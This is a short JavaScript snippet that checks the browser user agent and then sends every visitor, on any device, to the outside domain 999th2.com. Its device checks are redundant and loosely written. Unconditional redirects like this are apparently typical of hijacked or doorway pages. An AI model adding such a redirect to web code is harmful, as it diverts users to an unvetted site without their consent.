var browser = {
	versions: function () {
		var u = navigator.userAgent,
			app = navigator.appVersion;
		return {
			android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1,
			ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
			iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1,
			iPad: u.indexOf('iPad') > -1,
		};
	} ()
};
if (browser.versions.ios || browser.versions.iPhone || browser.versions.iPad) {
	window.location.href = "https://999th2.com";
	}else if (browser.versions.android) {
	window.location.href = "https://999th2.com";
}else{
	window.location.href = "https://999th2.com";
}